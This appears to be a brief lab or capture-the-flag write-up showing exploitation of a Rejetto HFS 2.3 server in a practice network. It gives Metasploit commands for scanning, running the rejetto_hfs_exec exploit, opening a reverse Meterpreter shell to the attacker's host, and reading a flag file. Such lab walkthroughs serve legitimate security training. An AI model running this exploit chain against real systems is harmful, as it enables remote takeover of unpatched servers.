# Exploiting A Vulnerable HTTP File Server

Rejetto HFS (HTTP File Server) is a popular free and open source HTTP file server

```bash
# Start Metasploit
# Nmap
msf6 > db_nmap -sS -sV -O 10.0.25.214
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-24 06:24 IST
[*] Nmap: Nmap scan report for demo.ine.local (10.0.25.214)
[*] Nmap: Host is up (0.0027s latency).
[*] Nmap: Not shown: 990 closed tcp ports (reset)
[*] Nmap: PORT      STATE SERVICE            VERSION
[*] Nmap: 80/tcp    open  http               HttpFileServer httpd 2.3   <- HTTP file server
[*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds

msf6 > search type:exploit name:rejetto
msf6 > use exploit/windows/http/rejetto_hfs_exec  2014-09-11
msf6 exploit(windows/http/rejetto_hfs_exec) > run
[*] Started reverse TCP handler on 10.10.38.3:4444 
[*] Using URL: http://10.10.38.3:8080/eVULPnJ3BMJvU5
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /eVULPnJ3BMJvU5
[*] Sending stage (176198 bytes) to 10.0.25.214
[!] Tried to delete %TEMP%\YQFWVrVyHdQr.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.38.3:4444 -> 10.0.25.214:49427) at 2025-07-24 06:30:59 +0530
[*] Server stopped.
meterpreter > 

# Meterpreter = x86 (not matching to the target machine)
# Able to change payload with command
meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows

# Find flag without changing payload
# Navigat to C:\
C:\>type flag.txt
type flag.txt
f74c8347798f4082daf4b4570dba094a
```